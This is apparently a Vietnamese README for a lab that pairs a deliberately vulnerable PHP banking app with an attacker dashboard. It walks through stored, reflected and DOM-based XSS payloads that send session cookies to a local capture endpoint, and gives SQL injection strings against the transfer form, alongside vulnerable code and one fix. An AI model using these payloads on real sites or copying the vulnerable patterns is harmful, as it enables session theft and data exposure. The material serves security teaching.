# XSS and SQL Injection Attack - Dự Án Demo

## 📋 Mục Đích Dự Án

Đây là một dự án giáo dục được thiết kế để thực hành và hiểu rõ hơn về hai loại lỗ hổng bảo mật phổ biến nhất:

1. **Cross-Site Scripting (XSS)** - Kỹ thuật tiêm mã JavaScript vào trang web
2. **SQL Injection** - Kỹ thuật tấn công cơ sở dữ liệu thông qua các truy vấn SQL độc hại


## 🏗️ Cấu Trúc Dự Án

xss-and-sql-injection-attack/
├── vulnerable-bank/          # Ứng dụng Ngân hàng có lỗ hổng
│   ├── index.php            # Trang đăng nhập
│   ├── dashboard.php        # Bảng điều khiển người dùng
│   ├── profile.php          # Trang hồ sơ (XSS vulnerability)
│   ├── transfer.php         # Trang chuyển tiền (SQL Injection vulnerability)
│   ├── cards.php            # Quản lý thẻ ảo
│   ├── loans.php            # Quản lý khoản vay
│   ├── bills.php            # Quản lý hóa đơn
│   ├── db.php               # Kết nối cơ sở dữ liệu
│   ├── functions.php        # Các hàm hỗ trợ
│   ├── setup.sql            # Script khởi tạo cơ sở dữ liệu
│   ├── docker-compose.yml   # Cấu hình Docker
│   ├── Dockerfile           # Dockerfile cho ứng dụng
│   └── css/                 # Các file CSS
├── attacker/                # Ứng dụng Tấn công
│   ├── index.php            # Dashboard tấn công
│   ├── capture.php          # Capture dữ liệu bị đánh cắp
│   ├── get_logs.php         # Xem nhật ký tấn công
│   └── Dockerfile           # Dockerfile cho attacker app
└── README.md               # Tài liệu này


## 📦 Cài Đặt và Chạy Demo


```bash
# Di chuyển vào thư mục dự án
cd /path/to/xss-and-sql-injection-attack

# Di chuyển vào thư mục vulnerable-bank
cd vulnerable-bank

# Khởi động tất cả containers
docker-compose up

# Chạy script SQL để khởi tạo dữ liệu
cat setup.sql | docker-compose exec -T db mysql -u root -proot vulnerable_bank


Sau khi containers khởi động thành công, mở trình duyệt web và truy cập:

| Dịch vụ | URL | Tài khoản | Mật khẩu |
|---------|-----|----------|---------|
| **Ngân Hàng** (Vulnerable App) | http://localhost:8080 | user1 | password123 |
| **PHPMyAdmin** (Database Management) | http://localhost:8081 | root | root |
| **Attacker Dashboard** (Capture Cookie/Data) | http://localhost:8082 | - | - |

## 🔑 Tài Khoản Mặc Định

Các tài khoản được tạo sẵn:

| Username | Password | Balance |
|----------|----------|---------|
| user1 | password123 | $5000 |
| user2 | password456 | $3000 |
| user3 | password789 | $2000 |

---

## 🎓 Hướng Dẫn Thực Thi Demo - Từng Bước Cơ Bản

### 📝 Bước 1: Đăng Nhập vào Ngân Hàng

1. Mở trình duyệt và truy cập: **http://localhost:8080**
2. Bạn sẽ thấy trang đăng nhập
3. Nhập thông tin:
   - **Username:** `user1`
   - **Password:** `password123`
4. Nhấn **"Login"**
5. Bạn sẽ được chuyển đến Dashboard Ngân Hàng

### 📋 Bước 2: Khám Phá Giao Diện Ứng Dụng

Sau khi đăng nhập, bạn sẽ thấy menu Sidebar với các trang:
- **Dashboard** - Trang chủ hiển thị số dư và thông tin
- **Profile** - Hồ sơ người dùng (có lỗ hổng XSS)
- **Transfer Money** - Chuyển tiền (có lỗ hổng SQL Injection)
- **Virtual Cards** - Quản lý thẻ ảo
- **Loans** - Quản lý khoản vay
- **Bills** - Quản lý hóa đơn
- **Feedback** - Gửi phản hồi (có lỗ hổng Stored XSS)
- **Logout** - Đăng xuất

---

## 🎯 Hướng Dẫn Khai Thác Các Lỗ Hổng - Chi Tiết

### 1. **Cross-Site Scripting (XSS) - Stored** 🔴 CRITICAL

**Vị trí:** Trang Feedback (`feedback.php`)

**Lỗ Hổng:** Ứng dụng lưu trữ user input trực tiếp mà không sanitize, cho phép tấn công viên lưu trữ mã độc.

#### Cách Khai Thác Chi Tiết:

**Bước 1: Chuyển đến trang Feedback**
- Từ Dashboard, nhấn **"Feedback"** trên Sidebar
- Bạn sẽ thấy form "SUBMIT FEEDBACK" với:
  - Trường "Title"
  - Trường "Message"

**Bước 2: Nhập Payload XSS**
- Nhập vào trường **"Message"**:
  ```html
  app nay hay qua
  <script>fetch("http://localhost:8082/capture.php?cookie="+document.cookie);</script>
  ```

**Bước 3: Gửi Feedback**
- Nhấn nút **"Submit"**
- Bạn sẽ thấy thông báo "Feedback submitted successfully"

**Bước 4: Kiểm Tra Dữ Liệu Bị Đánh Cắp**
- Mở tab mới, truy cập: **http://localhost:8082**
- Dashboard Attacker sẽ hiển thị cookies bị đánh cắp từ người dùng khác khi họ xem feedback

**Bước 5: Xác Minh (Optional)**
- Đăng nhập bằng tài khoản khác (user2/password456)
- Tìm trang Feedback hoặc xem log tất cả feedback
- Khi bạn xem feedback, cookie sẽ bị gửi tới Attacker Dashboard

**Kết Quả Mong Đợi:**
```
Cookie bị capture: PHPSESSID=abc123xyz...
```

---

### 2. **SQL Injection** 🔴 CRITICAL

**Vị Trí:** Trang Chuyển tiền (`transfer.php`)

**Lỗ Hổng:** Ứng dụng ghép user input trực tiếp vào câu lệnh SQL mà không sử dụng Prepared Statements.

#### Cách Khai Thác Chi Tiết:

**Bước 1: Chuyển đến trang Transfer Money**
- Từ Dashboard, nhấn **"Transfer Money"** trên Sidebar
- Bạn sẽ thấy form với các trường:
  - "To User ID" - ID người nhận tiền
  - "Amount" - Số tiền chuyển

**Bước 2: Nhập SQL Injection Payload**
- Nhập vào trường **"To User ID"**:
  ```sql
  1 OR 1=1 --
  ```
- Để trống hoặc nhập số bất kỳ vào "Amount"

**Bước 3: Thực Hiện Transfer**
- Nhấn nút **"Transfer"** hoặc **"Send"**

**Bước 4: Quan Sát Kết Quả**
- Thay vì hiển thị kết quả của user ID `1`, hệ thống sẽ hiển thị **TẤT CẢ** người dùng
- Điều này chứng minh SQL Injection đã thành công

**Payload Khác Để Thử:**
```sql
1 UNION SELECT user(), database(), version() --
```

**Kết Quả Mong Đợi:**
```
Users in system:
- ID: 1, Username: user1
- ID: 2, Username: user2
- ID: 3, Username: user3
```

---

### 3. **XSS - Reflected** 🟡 MEDIUM

**Vị Trí:** Các tham số URL (ví dụ: `search`, `error`, `message`)

**Lỗ Hổng:** Ứng dụng hiển thị giá trị từ URL parameter mà không encode, cho phép tiêm mã JavaScript.

#### Cách Khai Thác Chi Tiết:

**Bước 1: Tạo URL Malicious**
- Sao chép đường dẫn sau vào trình duyệt:
  ```
  http://localhost:8080/dashboard.php?search=<script>alert('XSS')</script>
  ```

**Bước 2: Truy Cập URL**
- Dán URL vào thanh địa chỉ và nhấn Enter
- Bạn sẽ thấy **popup alert** với nội dung "XSS"

**Bước 3: URL Phức Tạp Hơn (Capture Cookie)**
  ```
  http://localhost:8080/dashboard.php?search=<script>fetch("http://localhost:8082/capture.php?cookie="+document.cookie);</script>
  ```

**Lưu Ý:** Loại tấn công này thường được sử dụng trong **phishing** để lure người dùng click vào link độc hại.

---

### 4. **XSS - DOM-based** 🟡 MEDIUM ⭐ ADVANCED

**Vị Trí:** Dashboard (`dashboard.php`) - URL Fragment/Hash

**Lỗ Hổng:** JavaScript client-side sử dụng `innerHTML` với dữ liệu từ URL hash mà không sanitize.

#### Cách Khai Thác Chi Tiết:

**Bước 1: Tạo URL với XSS Payload trong Hash**
```
http://localhost:8080/dashboard.php#Special-Offer!<img src=x onerror="fetch('http://localhost:8082/capture.php?cookie='+document.cookie)">
```

**Bước 2: Truy Cập URL**
- Dán URL vào thanh địa chỉ và nhấn Enter
- Ứng dụng sẽ:
  1. Lấy hash từ URL
  2. Đặt vào innerHTML (vulnerable)
  3. `<img>` tag sẽ thực thi `onerror` event
  4. Cookie sẽ bị gửi tới Attacker Dashboard

**Bước 3: Xác Minh**
- Truy cập http://localhost:8082 để xem cookies bị capture

**Lỗi Code Vulnerable:**
```javascript
// In dashboard.php
const greetingMsg = decodeURIComponent(window.location.hash.substring(1));
document.getElementById('greetingText').innerHTML = greetingMsg; // ⚠️ VULNERABLE
```

**Fix Đúng:**
```javascript
// Safe way
document.getElementById('greetingText').textContent = greetingMsg; // ✅ SAFE
```

---

## 📊 Ứng Dụng Attacker

Dashboard Attacker (port 8082) hiển thị:
- Cookies bị đánh cắp từ các nạn nhân
- Dữ liệu được gửi qua XSS
- Nhật ký các tấn công thành công




## 🔍 Phân Tích Các Lỗ Hổng

### Vị trí Vulnerable Code:

**File: `vulnerable-bank/functions.php`**
```php
function get_user_data($conn, $user_id) {
    // VULNERABLE: Không sử dụng prepared statements
    $sql = "SELECT * FROM users WHERE id = $user_id";
    $result = $conn->query($sql);
    return $result->fetch_assoc();
}
```

**File: `vulnerable-bank/profile.php`**
```php
// VULNERABLE: XSS - hiển thị user input mà không escape
echo $user['profile_bio'];
```

---

## 🛑 Dừng Demo và Cleanup

### Dừng Containers

Nếu bạn muốn dừng các containers nhưng giữ lại dữ liệu:

**Trong terminal chạy docker-compose, nhấn:**
```
Ctrl + C
```

Hoặc **trong terminal mới:**
```bash
cd /path/to/xss-and-sql-injection-attack/vulnerable-bank
docker-compose stop
```

### Xóa Toàn Bộ (Reset)

Nếu bạn muốn xóa hoàn toàn containers, volumes, và dữ liệu:

```bash
cd /path/to/xss-and-sql-injection-attack/vulnerable-bank

# Dừng và xóa containers
docker-compose down

# Xóa luôn volumes (dữ liệu database)
docker-compose down -v
```

### Khởi Động Lại

```bash
cd vulnerable-bank
docker-compose up
```

---

## 🔧 Xác Minh Demo Hoạt Động Đúng

### ✅ Kiểm Tra 1: Containers Đang Chạy

```bash
docker ps
```

**Kết Quả Mong Đợi:** Bạn sẽ thấy 4 containers:
- `vulnerable-bank_web_1` - PHP Application
- `vulnerable-bank_attacker_1` - Attacker Dashboard
- `vulnerable-bank_db_1` - MySQL Database
- `vulnerable-bank_phpmyadmin_1` - PHPMyAdmin

### ✅ Kiểm Tra 2: Truy Cập Web

Mở trình duyệt và kiểm tra từng trang:

| URL | Kết Quả Mong Đợi |
|-----|------------------|
| http://localhost:8080 | Trang đăng nhập với form |
| http://localhost:8081 | PHPMyAdmin login page |
| http://localhost:8082 | Attacker Dashboard (có thể trống nếu chưa có tấn công) |

### ✅ Kiểm Tra 3: Database

Truy cập PHPMyAdmin:
1. URL: http://localhost:8081
2. Username: `root`
3. Password: `root`
4. Chọn database: `vulnerable_bank`
5. Xem các bảng: `users`, `transactions`, `virtual_cards`, `loans`, `bills`

### ✅ Kiểm Tra 4: Đăng Nhập Thành Công

1. Truy cập http://localhost:8080
2. Username: `user1`, Password: `password123`
3. Nhấn Login
4. Kết quả: Chuyển đến Dashboard hiển thị thông tin tài khoản

---

## 🐛 Troubleshooting - Các Vấn Đề Thường Gặp

### ❌ Vấn Đề 1: "Port 8080 already in use"

**Lỗi:**
```
Error starting userland proxy: listen tcp 0.0.0.0:8080: bind: address already in use
```

**Giải Pháp:**
```bash
# Cách 1: Tìm process sử dụng port 8080 và kill
lsof -i :8080
kill -9 <PID>

# Cách 2: Sử dụng port khác
# Chỉnh sửa docker-compose.yml:
# ports:
#   - "8090:80"  (thay đổi 8080 thành 8090)

# Cách 3: Dừng container cũ
docker-compose down
```

### ❌ Vấn Đề 2: "Cannot connect to database"

**Lỗi:**
```
Could not connect to MySQL server
```

**Giải Pháp:**
```bash
# Kiểm tra container db
docker ps | grep db

# Xem logs
docker-compose logs db

# Chờ database khởi động (khoảng 10-15 giây)
# Sau đó refresh trang web
```

### ❌ Vấn Đề 3: "database 'vulnerable_bank' doesn't exist"

**Lỗi:** Bảng dữ liệu chưa được tạo

**Giải Pháp:**
```bash
# Chạy SQL setup
cat setup.sql | docker-compose exec -T db mysql -u root -proot

# Kiểm tra lại
docker-compose exec -T db mysql -u root -proot vulnerable_bank -e "SHOW TABLES;"
```

### ❌ Vấn Đề 4: XSS Payload không hoạt động

**Nguyên nhân:** Payload không được gửi đúng cách hoặc bị filter

**Giải Pháp:**
1. Kiểm tra trình duyệt console (F12 → Console) có error không
2. Thử payload đơn giản trước: `<script>alert('test')</script>`
3. Kiểm tra xem có được sanitize không: Xem code source (F12 → Elements)
4. Thử các payload khác

### ❌ Vấn Đề 5: Không thấy cookies bị capture trên Attacker Dashboard

**Nguyên nhân:** 
- Ứng dụng attacker chưa nhận được request
- CORS issue hoặc network issue

**Giải Pháp:**
```bash
# Kiểm tra logs của attacker container
docker-compose logs attacker

# Kiểm tra xem payload có gửi đi không
# Mở F12 → Network tab → thực hiện exploit
# Xem có request đến http://localhost:8082 không
```

### ❌ Vấn Đề 6: Mất connection giữa chừng

**Nguyên nhân:** Docker container crashed

**Giải Pháp:**
```bash
# Kiểm tra logs
docker-compose logs

# Restart containers
docker-compose restart

# Hoặc khởi động lại hoàn toàn
docker-compose down
docker-compose up




